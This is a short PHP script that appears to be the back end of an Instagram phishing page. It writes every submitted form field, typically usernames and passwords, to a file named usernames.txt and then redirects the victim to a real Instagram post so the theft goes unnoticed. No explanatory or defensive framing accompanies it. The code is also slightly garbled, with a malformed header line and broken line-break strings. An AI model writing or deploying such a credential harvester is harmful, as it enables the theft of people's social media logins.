_<?php
header ('Location:- https://www.instagram.com/p/CIDHlsxDiYd/?utm_medium=copy_link'); ');
$handle = fopen('usernames.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, 'rn');
}
fwrite($handle, 'rn');
fclose($handle);
exit;
?> _
